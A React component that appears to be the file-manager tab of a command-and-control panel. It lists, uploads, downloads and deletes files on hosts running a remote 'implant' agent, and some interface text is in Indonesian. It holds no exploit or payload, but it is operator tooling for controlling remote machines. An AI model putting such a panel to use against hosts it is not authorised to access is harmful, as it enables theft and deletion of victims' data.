import { useState } from "react";
import { clientService } from "@/services/clientService";
import type { ClientInfo } from "@/services/clientService";
import { isClientOnline } from "@/lib/os";
import { Info } from "lucide-react";

type FileEntry = {
  name: string;
  is_dir: boolean;
  size: number;
  permissions: string;
  owner: string;
  group: string;
  modified: string | null;
  path: string;
};

type FileManagerTabProps = {
  clientId?: string;
  client?: ClientInfo | null;
};

function detectSeparator(osName?: string): "/" | "\\" {
  return osName?.toLowerCase().includes("win") ? "\\" : "/";
}

function defaultPathFor(osName?: string): string {
  return detectSeparator(osName) === "\\" ? "C:\\" : "/";
}

export default function FileManagerTab({ clientId, client }: FileManagerTabProps) {
  const initialPath = defaultPathFor(client?.os);
  const [currentPath, setCurrentPath] = useState(initialPath);
  const [pathInput, setPathInput] = useState(initialPath);
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [hasLoaded, setHasLoaded] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [error, setError] = useState<string | null>(null);

  const isOnline = client ? isClientOnline(client.last_seen) : false;
  const noAgent = !clientId;
  const disabled = noAgent || !isOnline;

  const loadDirectory = async (path: string) => {
    if (!clientId) return;
    setIsLoading(true);
    setError(null);
    try {
      const res = await clientService.listFiles(clientId, path);
      if (res && res.success && res.data) {
        setFiles(res.data.entries || []);
        setCurrentPath(path);
        setPathInput(path);
        setHasLoaded(true);
      } else {
        setError(res?.message || "Failed to list directory.");
      }
    } catch (err: unknown) {
      console.error("Failed to load directory:", err);
      const message = err instanceof Error ? err.message : "Error communicating with C2 agent.";
      setError(message);
    } finally {
      setIsLoading(false);
    }
  };

  const handleBrowse = () => {
    loadDirectory(pathInput);
  };

  const handleGoParent = () => {
    const safe = currentPath;
    if (!safe) return;
    const separator = detectSeparator(client?.os);
    const isWindows = separator === "\\";
    if (isWindows) {
      if (/^[A-Za-z]:[\\/]?$/.test(safe)) return;
      const parts = safe.split(/[\\/]/).filter(Boolean);
      if (parts.length <= 1) {
        const drive = parts[0]?.match(/^[A-Za-z]:/)?.[0] ?? safe;
        loadDirectory(`${drive}\\`);
      } else {
        parts.pop();
        loadDirectory(parts.join("\\") + "\\");
      }
    } else {
      if (safe === "/") return;
      const parts = safe.split("/").filter(Boolean);
      if (parts.length <= 1) {
        loadDirectory("/");
      } else {
        parts.pop();
        loadDirectory("/" + parts.join("/"));
      }
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      setSelectedFile(e.target.files[0]);
    }
  };

  const handleUpload = async () => {
    if (!selectedFile || !clientId) return;
    setIsUploading(true);
    setError(null);

    try {
      const fileData = await selectedFile.arrayBuffer();
      const separator = detectSeparator(client?.os);
      const trailing = currentPath.endsWith(separator) ? "" : separator;
      const destPath =
        currentPath === separator
          ? `${separator}${selectedFile.name}`
          : `${currentPath}${trailing}${selectedFile.name}`;

      await clientService.uploadFile(clientId, destPath, fileData);
      setSelectedFile(null);
      loadDirectory(currentPath);
    } catch (err: unknown) {
      console.error("Upload failed:", err);
      const message = err instanceof Error ? err.message : "Failed to upload file.";
      setError(message);
    } finally {
      setIsUploading(false);
    }
  };

  const handleDownload = (file: FileEntry) => {
    if (!clientId) return;
    const downloadUrl = clientService.getFileDownloadUrl(clientId, file.path);
    const link = document.createElement("a");
    link.href = downloadUrl;
    link.target = "_blank";
    link.download = file.name;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleDelete = async (file: FileEntry) => {
    const confirmed = window.confirm(`Are you sure you want to delete ${file.name}?`);
    if (!confirmed || !clientId) return;
    setIsLoading(true);
    setError(null);
    try {
      const res = await clientService.deleteFile(clientId, file.path);
      if (res && res.success) {
        loadDirectory(currentPath);
      } else {
        setError(res?.message || "Failed to delete file.");
      }
    } catch (err: unknown) {
      console.error("Delete failed:", err);
      const message = err instanceof Error ? err.message : "Failed to delete file.";
      setError(message);
    } finally {
      setIsLoading(false);
    }
  };

  const formatSize = (bytes: number) => {
    if (!bytes) return "0 B";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB", "TB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
  };

  return (
    <div className="space-y-6 font-mono">
      {noAgent && (
        <div className="p-3 border border-yellow-500/50 bg-yellow-950/20 text-yellow-300 font-mono text-sm rounded flex items-center gap-2">
          <Info size={16} className="shrink-0" />
          <span>NO AGENT SELECTED. Pilih agent dari dashboard untuk mengakses file manager.</span>
        </div>
      )}
      {!noAgent && !isOnline && (
        <div className="p-3 border border-red-500/50 bg-red-950/20 text-red-400 font-mono text-sm rounded flex items-start gap-2">
          <Info size={16} className="shrink-0 mt-0.5" />
          <span>
            AGENT OFFLINE. File operations butuh implant aktif. Last seen:{" "}
            {client?.last_seen ? new Date(client.last_seen).toLocaleString() : "unknown"}.
          </span>
        </div>
      )}

      <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
        <input
          type="text"
          value={pathInput}
          onChange={(e) => setPathInput(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && !disabled && handleBrowse()}
          className="flex-1 rounded-md border border-green/30 bg-[#161a1d]/50 px-4 py-2.5 text-gray-300 outline-none focus:border-green transition-colors disabled:opacity-50"
          placeholder={defaultPathFor(client?.os)}
          disabled={disabled}
        />
        <div className="flex gap-3 sm:gap-4">
          <button
            onClick={handleBrowse}
            disabled={disabled || isLoading}
            className="flex-1 rounded-md border border-green/30 bg-transparent px-6 py-2.5 text-white hover:bg-green/10 transition-colors cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? "Loading..." : "Browse"}
          </button>
          <button
            onClick={handleGoParent}
            disabled={disabled || isLoading}
            className="flex-1 rounded-md border border-green/30 bg-transparent px-6 py-2.5 text-white hover:bg-green/10 transition-colors whitespace-nowrap cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Go to Parent
          </button>
        </div>
      </div>

      {error && (
        <div className="p-4 border border-red-500/50 bg-red-950/20 text-red-400 font-mono text-sm rounded relative whitespace-pre-wrap break-words">
          [ERROR] FILE_MANAGER_FAULT: {error}
        </div>
      )}

      <div className="rounded-md border border-green/30 p-4 sm:p-6 bg-[#0B0F0B]">
        <h2 className="mb-4 sm:mb-6 text-lg sm:text-xl font-semibold text-white">File Upload</h2>
        <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4">
          <div className="flex items-center gap-4 w-full sm:w-auto">
            <label className={`rounded-md border border-green/30 bg-[#111811] px-6 py-2 text-white transition-colors whitespace-nowrap ${disabled ? "opacity-50 cursor-not-allowed" : "cursor-pointer hover:bg-green/10"}`}>
              Choose File
              <input
                type="file"
                onChange={handleFileChange}
                disabled={disabled || isUploading}
                className="hidden"
              />
            </label>
            <span className="text-gray-400 text-sm sm:text-base truncate max-w-[200px]">
              {selectedFile ? selectedFile.name : "No file selected"}
            </span>
          </div>
          <div className="flex-1 hidden sm:block" />
          <button
            onClick={handleUpload}
            disabled={disabled || isUploading || !selectedFile}
            className="w-full sm:w-auto rounded-md bg-green px-8 py-2 font-semibold text-[#0B0F0B] hover:bg-green/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            {isUploading ? "Uploading..." : "Upload"}
          </button>
        </div>
      </div>

      <div className="rounded-md border border-green/30 p-4 sm:p-6 bg-[#0B0F0B]">
        <h2 className="mb-4 sm:mb-6 text-lg sm:text-xl font-semibold text-white">
          Directory Contents ({currentPath})
        </h2>
        <div className="overflow-x-auto pr-2 custom-scrollbar">
          {isLoading ? (
            <div className="text-center py-12 text-green animate-pulse">
              LOADING DIRECTORY CONTENTS...
            </div>
          ) : !hasLoaded ? (
            <div className="text-gray-500 text-sm italic text-center py-12 border border-dashed border-green/20 rounded-lg">
              {disabled
                ? "Agent unavailable."
                : `Enter a path above and press "Browse" to list directory contents (try ${defaultPathFor(client?.os)}).`}
            </div>
          ) : files.length === 0 ? (
            <div className="text-gray-500 text-sm italic text-center py-12 border border-dashed border-green/20 rounded-lg">
              Empty directory.
            </div>
          ) : (
            <table className="w-full text-left text-sm whitespace-nowrap">
              <thead>
                <tr className="border-b border-green/30">
                  <th className="pb-4 pr-6 font-medium text-white">Name</th>
                  <th className="pb-4 pr-6 font-medium text-white">Type</th>
                  <th className="pb-4 pr-6 font-medium text-white">Size</th>
                  <th className="pb-4 pr-6 font-medium text-white">Permissions</th>
                  <th className="pb-4 pr-6 font-medium text-white">Owner</th>
                  <th className="pb-4 pr-6 font-medium text-white">Modified</th>
                  <th className="pb-4 font-medium text-white">Actions</th>
                </tr>
              </thead>
              <tbody>
                {files.map((file, i) => {
                  const isDir = file.is_dir;
                  const ownerLabel =
                    file.owner || file.group ? `${file.owner || ""} : ${file.group || ""}` : "-";
                  const dateLabel = file.modified ? new Date(file.modified).toLocaleString() : "-";

                  return (
                    <tr
                      key={`${file.path}-${i}`}
                      className="border-b border-green/30 last:border-0 hover:bg-green/5 transition-colors"
                    >
                      <td className="py-4 pr-6 text-green font-medium max-w-[240px] truncate" title={file.name}>
                        {isDir ? "📁" : "📄"} {file.name}
                      </td>
                      <td className="py-4 pr-6 text-green">{isDir ? "Dir" : "File"}</td>
                      <td className="py-4 pr-6 text-green">
                        {isDir ? "-" : formatSize(file.size)}
                      </td>
                      <td className="py-4 pr-6 text-green">{file.permissions || "-"}</td>
                      <td className="py-4 pr-6 text-green">{ownerLabel}</td>
                      <td className="py-4 pr-6 text-green whitespace-pre-line leading-relaxed">
                        {dateLabel}
                      </td>
                      <td className="py-4">
                        <div className="flex gap-3">
                          {isDir ? (
                            <button
                              onClick={() => loadDirectory(file.path)}
                              className="rounded border border-green px-4 py-1 text-xs text-green hover:bg-green/10 transition-colors cursor-pointer"
                            >
                              Open
                            </button>
                          ) : (
                            <button
                              onClick={() => handleDownload(file)}
                              className="rounded border border-green px-4 py-1 text-xs text-green hover:bg-green/10 transition-colors cursor-pointer"
                            >
                              Download
                            </button>
                          )}
                          <button
                            onClick={() => handleDelete(file)}
                            className="rounded border border-red-600 px-4 py-1 text-xs text-red-600 hover:bg-red-600/10 transition-colors cursor-pointer"
                          >
                            Delete
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );
}
